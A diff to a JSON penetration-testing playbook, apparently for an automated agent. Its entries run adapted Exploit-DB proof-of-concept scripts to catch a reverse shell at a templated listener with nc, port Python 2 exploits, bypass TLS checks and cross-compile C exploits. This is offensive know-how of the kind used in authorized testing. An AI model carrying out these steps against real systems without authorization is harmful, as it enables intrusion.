@@ -532,6 +532,238 @@
       "deprioritize_when": [
         "foothold.linux"
       ]
+    },
+    {
+      "id": "edb-run-adapted-exploit",
+      "title": "Run Adapted Exploit-DB PoC for Foothold",
+      "hypothesis": "Once you have mirrored and inspected the Exploit-DB PoC, fixed any Python 2 syntax or hardcoded Burp proxy, and substituted your target URL/IP and listener address ({{lhost}}:{{lport}}), execute the adapted script with a netcat listener waiting to catch the reverse shell or verify command execution.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "bash",
+        "nc"
+      ],
+      "locus": "R",
+      "phase": "access",
+      "requires_all": [
+        "exploit.script_inspected",
+        "vuln.edb_poc_inspected"
+      ],
+      "requires_any": [],
+      "produces": [
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows"
+      ],
+      "settled_by": [
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows"
+      ],
+      "obsoleted_by": [
+        "foothold.linux",
+        "foothold.windows"
+      ],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 78,
+      "proves": "remote code execution and an initial shell on the target using the adapted public PoC",
+      "does_not_prove": "elevated root or SYSTEM privileges unless the vulnerable service itself runs as root or LocalSystem",
+      "report": {
+        "finding": "Remote Code Execution via Public Exploit-DB Vulnerability",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "python3 {{edb_file|exploit.py}} --url {{url}} --lhost {{lhost}} --lport {{lport}}",
+          "note": "Flag-based PoC invocation: match the exact flag names (--url/-u, --rhost/-t, --lhost, --lport) surfaced during script inspection, with `nc -lvnp {{lport}}` listening in another pane."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 {{edb_file|exploit.py}} {{url}} {{lhost}} {{lport}}",
+          "note": "Positional sys.argv PoC invocation: pass the target URL or IP and callback address in the exact argv order shown in the script's Usage block."
+        },
+        {
+          "tool": "bash",
+          "run": "bash {{edb_file|exploit.sh}} {{target}} {{web_port}} {{lhost}} {{lport}}",
+          "note": "Shell PoC invocation: run a mirrored Bash/curl exploit script after verifying its target URL and payload arguments."
+        }
+      ]
+    },
+    {
+      "id": "fix-edb-py2",
+      "title": "Adapt Legacy Python 2 Exploit-DB PoC to Python 3",
+      "hypothesis": "Older Exploit-DB scripts fail on modern Kali with `SyntaxError: Missing parentheses in call to 'print'`, `ModuleNotFoundError: No module named 'urllib2'`, or byte/string TypeErrors. Strip CRLF line endings, declare UTF-8 encoding, and convert the script in place with `2to3 -w` (or run under python2 when available) instead of abandoning a valid exploit.",
+      "tool": "python3",
+      "tools": [
+        "sh",
+        "dos2unix",
+        "python3"
+      ],
+      "locus": "R",
+      "phase": "access",
+      "requires_all": [],
+      "requires_any": [
+        "exploit.hazard_py2",
+        "blocker.py2_syntax_or_module"
+      ],
+      "produces": [
+        "advice.edb_py2"
+      ],
+      "priority": 68,
+      "proves": "nothing on the target by itself; converts a legacy Python 2 PoC so it executes cleanly under Python 3",
+      "does_not_prove": "that the target is vulnerable until the converted PoC runs against the service",
+      "report": {
+        "finding": "Python 2 Exploit-DB PoC adapted for Python 3",
+        "severity": "info"
+      },
+      "refs": [
+        "https://docs.python.org/3/library/2to3.html"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "dos2unix {{edb_file|exploit.py}} 2>/dev/null; sed -i '1i # -*- coding: utf-8 -*-' {{edb_file|exploit.py}} && 2to3 -w {{edb_file|exploit.py}}",
+          "note": "Normalize CRLF line endings, add a UTF-8 header for non-ASCII author banners, and rewrite Python 2 print/except/urllib2/raw_input syntax to Python 3."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -m py_compile {{edb_file|exploit.py}} && grep -nE '\\.encode\\(|\\.decode\\(|urllib\\.request|requests\\.' {{edb_file|exploit.py}}",
+          "note": "Verify zero syntax errors remain and check socket/base64 calls where Python 3 expects `bytes` (`b'...'` or `.encode()`) instead of `str`."
+        }
+      ]
+    },
+    {
+      "id": "fix-edb-python-deps",
+      "title": "Resolve Missing Python Exploit Dependencies (PEP 668 Venv)",
+      "hypothesis": "Modern Debian and Kali block system-wide `pip install` (`error: externally-managed-environment`, PEP 668), and public PoCs frequently import third-party packages (`Crypto`/`pycryptodome`, `requests_toolbelt`, `bs4`, `pwn`, `jwt`, `yaml`). Create a throwaway virtual environment in `/tmp/edb-venv` and install the missing dependency there without touching system packages.",
+      "tool": "python3",
+      "tools": [
+        "python3"
+      ],
+      "locus": "R",
+      "phase": "access",
+      "requires_all": [
+        "blocker.python_dep_or_pep668"
+      ],
+      "requires_any": [],
+      "produces": [
+        "advice.edb_deps"
+      ],
+      "priority": 68,
+      "proves": "nothing on the target by itself; provisions an isolated Python virtual environment with the packages the PoC imports",
+      "does_not_prove": "exploit success until you re-run the PoC with `/tmp/edb-venv/bin/python3`",
+      "report": {
+        "finding": "Isolated Python venv created for exploit dependencies (PEP 668)",
+        "severity": "info"
+      },
+      "refs": [
+        "https://peps.python.org/pep-0668/"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "python3 -m venv /tmp/edb-venv && /tmp/edb-venv/bin/pip install --upgrade pip pycryptodome requests beautifulsoup4 requests-toolbelt pyyaml PyJWT",
+          "note": "Create an isolated venv (bypassing PEP 668 cleanly) and install the most common Exploit-DB third-party libraries (`pycryptodome` satisfies `from Crypto...`)."
+        },
+        {
+          "tool": "python3",
+          "run": "/tmp/edb-venv/bin/python3 {{edb_file|exploit.py}} --help",
+          "note": "Run the PoC with the venv interpreter directly so every installed package resolves."
+        }
+      ]
+    },
+    {
+      "id": "fix-edb-proxy-tls",
+      "title": "Fix Hardcoded Burp Proxy or Self-Signed TLS Failure in PoC",
+      "hypothesis": "Exploit authors routinely leave `proxies = {'http': 'http://127.0.0.1:8080'}` enabled from debugging in Burp, causing `ProxyError` / `Connection refused` when Burp is closed, or fail against lab HTTPS endpoints with `CERTIFICATE_VERIFY_FAILED` because `verify=False` was omitted. Strip the hardcoded proxy or disable certificate verification in the local copy and re-run.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "python3"
+      ],
+      "locus": "R",
+      "phase": "access",
+      "requires_all": [],
+      "requires_any": [
+        "exploit.hazard_burp_proxy",
+        "blocker.hardcoded_proxy",
+        "blocker.tls_cert_verify"
+      ],
+      "produces": [
+        "advice.edb_http"
+      ],
+      "priority": 68,
+      "proves": "nothing on the target by itself; removes localhost debug proxies and self-signed TLS verification blocks from the PoC",
+      "does_not_prove": "that the HTTP payload lands until the patched PoC is re-executed against the target",
+      "report": {
+        "finding": "Hardcoded debug proxy or TLS verification fixed in PoC",
+        "severity": "info"
+      },
+      "refs": [
+        "https://docs.python-requests.org/en/latest/user/advanced/#ssl-cert-verification"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "sed -i -E \"s/proxies\\s*=\\s*\\{[^}]*127\\.0\\.0\\.1:(8080|8000|8888)[^}]*\\}/proxies = {}/g; s/proxies\\s*=\\s*proxies/proxies=None/g\" {{edb_file|exploit.py}}",
+          "note": "Neutralize hardcoded `127.0.0.1:8080` Burp debug proxy dictionaries in the mirrored Python PoC so requests go straight to the target."
+        },
+        {
+          "tool": "python3",
+          "run": "PYTHONHTTPSVERIFY=0 CURL_CA_BUNDLE=\"\" python3 -W ignore {{edb_file|exploit.py}} --url {{url}}",
+          "note": "Bypass self-signed TLS certificate verification errors (`CERTIFICATE_VERIFY_FAILED`); if `requests` still enforces verify, add `verify=False` to its `.get()` / `.post()` calls."
+        }
+      ]
+    },
+    {
+      "id": "fix-edb-c-compile",
+      "title": "Fix C Exploit Architecture, GLIBC, or Cross-Compile Mismatch",
+      "hypothesis": "A C exploit compiled on modern Kali links against Kali's new `GLIBC_2.3x` and 64-bit ABI, failing on older targets with `version GLIBC_2.34 not found` or `Exec format error`. Prefer compiling directly on the target if `gcc` is present; otherwise link statically (`-static`), target 32-bit (`-m32` with `gcc-multilib`), or cross-compile Windows `.c` PoCs with `x86_64-w64-mingw32-gcc`.",
+      "tool": "gcc",
+      "tools": [
+        "gcc"
+      ],
+      "locus": "R",
+      "phase": "escalate",
+      "requires_all": [],
+      "requires_any": [
+        "exploit.hazard_c_compile",
+        "blocker.glibc_or_arch_mismatch"
+      ],
+      "produces": [
+        "advice.edb_compile"
+      ],
+      "priority": 68,
+      "proves": "nothing on the target by itself; produces a binary matching the target OS, CPU word size, and C runtime",
+      "does_not_prove": "privilege escalation until the compiled binary runs on the target",
+      "report": {
+        "finding": "C exploit compiled to match target architecture and libc",
+        "severity": "info"
+      },
+      "refs": [
+        "https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html"
+      ],
+      "commands": [
+        {
+          "tool": "gcc",
+          "run": "gcc {{edb_file|exploit.c}} -o exploit -static -pthread 2>/dev/null || gcc -m32 {{edb_file|exploit.c}} -o exploit32 -static",
+          "note": "Compile statically on Kali so the binary carries no dynamic `GLIBC_2.3x` dependency (use `-m32` when `uname -m` on the target is `i686`; install `gcc-multilib` if `gnu/stubs-32.h` is missing)."
+        },
+        {
+          "tool": "gcc",
+          "run": "x86_64-w64-mingw32-gcc {{edb_file|exploit.c}} -o exploit.exe -lws2_32",
+          "note": "Cross-compile a Windows C exploit from Kali into a standalone PE executable (`use i686-w64-mingw32-gcc` for 32-bit Windows targets)."
+        }
+      ]
     }
   ],
   "id": "shells_2026_09"
